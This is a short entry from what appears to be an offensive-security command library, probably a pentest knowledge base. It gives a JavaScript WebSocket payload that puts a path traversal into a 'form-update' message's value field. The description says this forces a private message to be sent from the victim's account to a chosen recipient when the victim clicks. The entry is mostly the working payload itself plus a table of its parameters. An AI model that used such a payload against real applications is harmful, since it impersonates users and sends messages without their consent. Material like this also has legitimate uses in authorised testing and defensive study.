---
id: cmd-837328-form-update-message
data: >-
  ws.send(JSON.stringify({type: 'form-update', element: '#algo-id', server-echo:
  true, value:
  '../../../../../../users/send_user_message?msg=test&recipient_id=5bdd747c62796e0049ad0727#',
  clientId: 'x', roomId: '5ce6e50b298f7c6e0acb68c6'}));
tags:
  - websocket
  - path-traversal
  - spam
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:27.977Z'
verified: false
validated: true
submitted: true
---
# websocket-form-update-message

## Command

```javascript
ws.send(JSON.stringify({
  type: 'form-update',
  element: '#algo-id',
  "server-echo": true,
  value: '../../../../../../users/send_user_message?msg=test&recipient_id=5bdd747c62796e0049ad0727#',
  clientId: 'x',
  roomId: '5ce6e50b298f7c6e0acb68c6'
}));
```

## Description

Deploys traversal to force a private message send from victim's account to a specified recipient upon button click.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| type | Type | Yes |
| element | Element | Yes |
| server-echo | Flag for echoing | No |
| value | Message payload | Yes |
| clientId | ID | Yes |
| roomId | Room | Yes |

## Examples

### Basic Usage

```javascript
// As above
```

## Expected Output

Message 'test' sent to recipient ID from victim's account.

## Related

- [[commands/websocket-form-update-profile]]
- [[procedures/Send-Malicious-WebSocket-Form-Update]]
